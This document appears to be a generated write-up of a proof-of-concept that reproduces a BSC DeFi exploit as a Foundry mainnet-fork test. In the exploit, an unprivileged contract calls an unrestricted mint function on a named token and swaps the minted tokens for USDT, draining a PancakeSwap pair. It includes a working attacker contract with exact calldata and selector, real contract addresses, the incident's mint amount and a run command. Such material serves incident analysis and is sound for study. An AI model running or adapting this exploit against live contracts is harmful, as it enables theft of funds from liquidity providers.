## Overview & Context

This proof-of-concept (PoC) demonstrates the BSC mainnet exploit in which an adversary abuses an **unrestricted mint function** on ERC20 token `0xc3b1b45e5784a8efececfc0be2e28247d3f49963` to drain **stablecoin liquidity** (`0x55d398326f99059ff775485246999027b3197955`, USDT-like) from a Pancake/UniswapV2-style AMM pair `0x794ed5e8251c4a8d321ca263d9c0bc8ecf5fa1ff`.

The PoC is implemented as a Foundry mainnet-fork test that:
- Forks BSC at the ACT pre-state block `44,280,828`.
- Deploys a fresh attacker helper contract that calls the real mint entrypoint (selector `0xa7c861da`) on the exploit token.
- Executes a mint-and-swap through the incident router and pair to realize stablecoin profit and victim pool depletion.

**Command to run the PoC:**

```bash
cd forge_poc
BSC_RPC_URL="$RPC_URL_FOR_CHAINID_56" forge test --via-ir -vvvvv
```

Where `RPC_URL_FOR_CHAINID_56` is built from the QuickNode template in `artifacts/poc/rpc/chainid_rpc_map.json` and `.env` as required by the experiment harness.

---

## PoC Architecture & Key Contracts

The PoC centers on two local contracts and several on-chain contracts:

- **Local adversary contract**: `AttackerHelper` (deployed inside the test).
- **Main test harness**: `ExploitTest` in `test/Exploit.sol`.
- **On-chain protocol contracts (BSC, chainid 56)**:
  - `exploit_token`: `0xc3B1b45e5784A8efececfC0BE2E28247d3f49963`
  - `stablecoin_token`: `0x55d398326f99059fF775485246999027B3197955`
  - `amm_pair`: `0x794ed5E8251C4A8D321CA263D9c0bC8Ecf5fA1FF`
  - `router`: `0x10ED43C718714eb63d5aA57B78B54704E256024E`
  - `factory`: `0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73`

### AttackerHelper Contract

`AttackerHelper` is a simplified local clone of the incident helper. It:
- Stores references to `exploitToken`, `stablecoinToken`, `router`, and `factory`.
- Exposes an `attack(uint256 mintAmount)` function that:
  1. Calls the **unrestricted mint entrypoint** on `exploitToken` via low-level calldata using selector `0xa7c861da`, minting `mintAmount` tokens to itself.
  2. Approves the router to spend the minted tokens.
  3. Swaps `exploitToken` → `stablecoinToken` via `swapExactTokensForTokens`, sending output to itself.

Representative snippet (simplified) from `AttackerHelper`:

```solidity
function attack(uint256 mintAmount) external {
    bytes memory data = abi.encodeWithSelector(
        bytes4(0xa7c861da),
        uint256(0),
        address(this),
        mintAmount,
        uint256(0x80),
        uint256(0)
    );
    (bool ok, ) = address(exploitToken).call(data);
    require(ok, "mint call failed in attack");

    exploitToken.approve(address(router), mintAmount);

    address[] memory path = new address[](2);
    path[0] = address(exploitToken);
    path[1] = address(stablecoinToken);

    router.swapExactTokensForTokens(
        mintAmount,
        0,
        path,
        address(this),
        block.timestamp + 1
    );
}
```

**Caption:** `AttackerHelper.attack` calls the unrestricted mint via selector `0xa7c861da`, then routes the freshly minted tokens through the AMM to acquire stablecoin.

### ExploitTest Harness

`ExploitTest`:
- Forks BSC at block `44_280_828` (just before exploit block `44_280_829`).
- Instantiates interfaces for all incident contracts.
- Creates a fresh attacker EOA via `makeAddr("attacker_eoa")`.
- Deploys `AttackerHelper` with the incident addresses.
- Verifies that the factory’s `getPair` matches the expected AMM pair.

---

## Adversary Execution Flow

This section describes the end-to-end ACT sequence as executed by `ExploitTest::test_Exploit_UnrestrictedMintDrainsAMM`.

### 1. Funding and Environment Setup

At `setUp()`:
- The test sets a BSC mainnet fork at block `44_280_828` using `vm.createFork` and `vm.selectFork`.
- It wires the on-chain contracts:
  - `IExploitToken exploitToken = IExploitToken(EXPLOIT_TOKEN_ADDR);`
  - `IERC20 stablecoinToken = IERC20(STABLECOIN_TOKEN_ADDR);`
  - `IPancakeRouter router = IPancakeRouter(ROUTER_ADDR);`
  - `IPancakeFactory factory = IPancakeFactory(FACTORY_ADDR);`
- It deploys `AttackerHelper` and labels all key actors with `vm.label` for trace clarity.
- It confirms AMM wiring:

```solidity
address onChainPair = factory.getPair(EXPLOIT_TOKEN_ADDR, STABLECOIN_TOKEN_ADDR);
assertEq(onChainPair, AMM_PAIR_ADDR, "factory pair mismatch for exploit/stable tokens");
```

**Caption:** `setUp()` ensures the forked environment matches the real incident topology.

### 2. Pre-Checks (Oracle Pre-State)

`test_Exploit_UnrestrictedMintDrainsAMM()` first calls:

- `_preCheckLiquidityAndHelperBalances()`:

```solidity
uint256 pairStableBefore = stablecoinToken.balanceOf(AMM_PAIR_ADDR);
assertGt(pairStableBefore, 0, "AMM pair must initially hold stablecoin_token liquidity");

uint256 helperStableBefore = stablecoinToken.balanceOf(address(attackerHelper));
assertEq(helperStableBefore, 0, "helper should not hold stablecoin_token before exploit");
```

- `_preCheckUnrestrictedMintBehavior()`:
  - Takes a snapshot.
  - Reads `exploitToken.totalSupply()` and helper’s `exploitToken` balance.
  - With `vm.prank(address(attackerHelper))`, calls the same mint entrypoint via low-level calldata with a small amount (`1 ether`).
  - Asserts both totalSupply and helper balance increase.
  - Reverts the snapshot to restore pre-mint state.

This confirms the **root cause**: an unprivileged helper can mint arbitrary amounts of `exploit_token`.

### 3. Exploit Execution (Mint-and-Swap)

In the main test:
- The profit asset type oracle is checked:

```solidity
address profitAsset = address(stablecoinToken);
assertEq(profitAsset, STABLECOIN_TOKEN_ADDR, "profit asset must be the designated stablecoin_token");
```

- Pre-exploit balances are captured:

```solidity
uint256 pairStableBefore = stablecoinToken.balanceOf(AMM_PAIR_ADDR);
uint256 helperStableBefore = stablecoinToken.balanceOf(address(attackerHelper));
```

- The test uses the real on-chain mint amount from tx `0xc29c…`:

```solidity
uint256 mintAmount = 0x0531e553441b2d50bac038;
```

- Total supply is recorded, then the exploit is triggered:

```solidity
uint256 supplyBeforeAttack = exploitToken.totalSupply();
reproducerAttack(mintAmount); // vm.prank(attacker); attackerHelper.attack(mintAmount);
uint256 supplyAfterAttack = exploitToken.totalSupply();
assertGt(supplyAfterAttack, supplyBeforeAttack, "mint must increase totalSupply during exploit");
```

- Post-exploit balances are read:

```solidity
uint256 pairStableAfter = stablecoinToken.balanceOf(AMM_PAIR_ADDR);
uint256 helperStableAfter = stablecoinToken.balanceOf(address(attackerHelper));
```

The BSC trace (from the Foundry logs) shows:
- A large mint of `exploit_token` into `AttackerHelper`.
- A transfer of the minted amount from `AttackerHelper` to `AMM_PAIR`.
- A swap where `AMM_PAIR` transfers `31,538,624,555,626,362,308,555` units of `stablecoin_token` to `AttackerHelper`.
- Final balances with:
  - `helperStableAfter > helperStableBefore`
  - `pairStableAfter < pairStableBefore`

### 4. Profit Realization and Cleanup

Finally, the test encodes the hard and soft flow oracles:

```solidity
assertLt(pairStableAfter, pairStableBefore, "AMM pair must lose stablecoin_token during exploit");
assertGt(helperStableAfter, helperStableBefore, "helper must gain stablecoin_token during exploit");

// Soft predicates (directional)
assertGt(helperStableAfter, helperStableBefore, "attacker-controlled helper must realize positive profit in stablecoin_token");
assertLt(pairStableAfter, pairStableBefore, "AMM pair must suffer net loss of stablecoin_token during exploit");
```

**Caption:** The main test asserts that the helper profits in stablecoin and the AMM pair loses stablecoin, consistent with the incident.

---

## Oracle Definitions and Checks

The PoC implements the oracle specification from `oracle_definition.json` as follows:

### Variables

- `attacker`: a fresh local EOA (`makeAddr("attacker_eoa")`).
- `attacker_helper`: the locally deployed `AttackerHelper`.
- `exploit_token`: BSC token `0xc3b1…`.
- `stablecoin_token`: BSC token `0x55d3…` (USDT-like).
- `amm_pair`: `0x794e…`, the pool between `exploit_token` and `stablecoin_token`.
- `router`: Pancake/UniswapV2 router `0x10ed…`.
- `factory`: `0xca143c…`, providing `getPair`.

### Pre-Check Oracles

1. **Pair has positive stablecoin liquidity**
   - Implemented in `_preCheckLiquidityAndHelperBalances()`:
   - `assertGt(stablecoinToken.balanceOf(AMM_PAIR_ADDR), 0, ...)`

2. **Helper starts with zero stablecoin**
   - Same helper function:
   - `assertEq(stablecoinToken.balanceOf(address(attackerHelper)), 0, ...)`

3. **Unrestricted mint succeeds from an unprivileged helper**
   - Implemented in `_preCheckUnrestrictedMintBehavior()`:
   - Uses `vm.snapshot` and `vm.prank(address(attackerHelper))` to:
     - Call the mint-like function via selector `0xa7c861da`.
     - Assert `totalSupply` and helper `exploit_token` balance both increase.
     - Restore state via `vm.revertTo`.

### Hard Constraints

1. **hard_asset_type_stablecoin_profit**
   - Asserts that the profit is denominated in `stablecoin_token`:

```solidity
address profitAsset = address(stablecoinToken);
assertEq(profitAsset, STABLECOIN_TOKEN_ADDR, "profit asset must be the designated stablecoin_token");
```

2. **hard_unrestricted_mint_behavior**
   - In pre-check, the helper:
     - Calls the mint entrypoint via low-level calldata.
     - Causes `totalSupply` and helper `exploit_token` balance to increase.
   - In the main exploit, `supplyAfterAttack > supplyBeforeAttack` further confirms mint behavior during the full attack.

3. **hard_flow_pair_to_helper**
   - The main test explicitly asserts:
     - `pairStableAfter < pairStableBefore` (AMM pair loses stablecoin).
     - `helperStableAfter > helperStableBefore` (helper gains stablecoin).

### Soft Constraints

1. **soft_attacker_profit_stablecoin**
   - The same `helperStableAfter > helperStableBefore` assertion captures positive profit in `stablecoin_token`.

2. **soft_victim_depletion_stablecoin**
   - `pairStableAfter < pairStableBefore` enforces directional depletion of the AMM pool’s `stablecoin_token`.

**Summary:** All pre-checks, hard constraints, and soft constraints defined in the oracle JSON are implemented and pass on the BSC fork.

---

## Validation Result and Robustness

The validator summary is stored at:
- `artifacts/poc/poc_validator/poc_validated_result.json`

Key fields:

- `overall_status: "Pass"`
- `poc_correctness_checks.passes_validation_oracles.passed: true`
- `poc_quality_checks.*.passed: true` for:
  - `oracle_alignment_with_definition`
  - `human_readable_and_labeled`
  - `no_magic_numbers_and_values_are_derived`
  - `self_contained_no_attacker_side_artifacts` (all subchecks)
  - `end_to_end_attack_process_described`
  - `alignment_with_root_cause`
- `artifacts.validator_test_log_path`:
  - `"artifacts/poc/poc_validator/forge-test.log"`

**Robustness notes:**
- The PoC uses the **real incident mint amount** and the actual mainnet contract addresses, so it exercises the same economic regime as the attack.
- At the same time, it is **self-contained**: all attacker identities and helper contracts are fresh and local; no attacker-side artifacts are copied from mainnet.
- The oracles are encoded via straightforward balance and supply inequalities, which are stable against minor changes in pool reserves or fork behavior.

---

## Linking PoC Behavior to Root Cause

### Exercising the Vulnerable Logic

Root cause (`root_cause_report.md` and `root_cause.json`) identifies:
- A public function with selector `0xa7c861da` on token `0xc3b1…`:
  - `Unresolved_a7c861da(uint16 arg0, address arg1, uint256 arg2, uint256 arg3)`
  - It increases `totalSupply` and `arg1`’s balance without checking `msg.sender`.

In the PoC:
- `_preCheckUnrestrictedMintBehavior()` uses `vm.prank(address(attackerHelper))` to call this selector directly and checks that `totalSupply` and helper balance increase.
- `AttackerHelper.attack` calls the same entrypoint with the **real incident mint amount**, proving that:
  - An unprivileged helper can mint arbitrarily large quantities of `exploit_token`.
  - This mint is the source of the subsequent drain.

### Demonstrating AMM Stablecoin Drain

The root cause report states that:
- Minted `exploit_token` is routed through AMM pair `0x794e…` via router `0x10ed…`.
- Stablecoin `0x55d3…` flows from the pair to the helper in large quantity.

In the PoC trace:
- `Router::swapExactTokensForTokens` pulls the minted `exploit_token` from `AttackerHelper` and sends it to the pair.
- `AMMPair::swap` sends `31,538,624,555,626,362,308,555` units (on the order of `3.15e22`) of `stablecoin_token` from the pair to `AttackerHelper`.
- The test asserts:
  - `helperStableAfter > helperStableBefore` — helper profit.
  - `pairStableAfter < pairStableBefore` — victim pool depletion.

### ACT Framing and Roles

Under the ACT framing:
- **Adversary-crafted transaction:** The helper’s `attack` call (mirroring tx `0xc29c…`) sent by the attacker EOA to the helper.
- **Victim:** The AMM pair contract holding `stablecoin_token` reserves.
- **Opportunity:** The presence of a permissionless mint on `exploit_token` and a liquid AMM pool against a valuable stablecoin.

Roles in the PoC:
- `attacker` (fresh EOA) → initiates `reproducerAttack`.
- `attacker_helper` (local `AttackerHelper`) → executes mint-and-swap sequence.
- `exploit_token` → vulnerable ERC20 with unrestricted mint.
- `stablecoin_token` → reference asset for profit.
- `amm_pair` → victim liquidity pool.
- `router` / `factory` → routing and discovery, as in the original incident.

The PoC’s success criteria—helper profit in `stablecoin_token` and AMM depletion—directly encode the exploit predicate described in the root cause report and the oracle definition, confirming that the reproduced behavior is **root-cause accurate**, not just superficially similar.

